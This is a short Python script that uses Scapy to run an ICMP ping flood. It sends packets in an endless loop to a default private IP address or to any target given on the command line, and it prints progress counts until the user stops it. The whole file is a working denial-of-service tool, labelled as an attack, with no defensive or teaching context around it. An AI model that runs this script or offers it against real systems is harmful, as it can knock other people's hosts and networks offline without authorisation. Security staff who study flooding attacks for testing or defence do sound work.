from scapy.all import IP, ICMP, send
import sys
import time

# --- CONFIGURATION ---
TARGET_IP = "192.168.166.167"

if len(sys.argv) > 1:
    TARGET_IP = sys.argv[1]

print(f"[*] ATTACK: ICMP (Ping) Flood")
print(f"[*] TARGET: {TARGET_IP}")
print(f"[*] PRESS CTRL+C TO STOP")
time.sleep(2)

count = 0
try:
    while True:
        pkt = IP(dst=TARGET_IP)/ICMP()
        send(pkt, verbose=0)
        count += 1
        if count % 100 == 0:
            print(f"[!] Sent {count} ICMP packets...", end='\r')
except KeyboardInterrupt:
    print(f"\n[+] Stopped. Total: {count}")
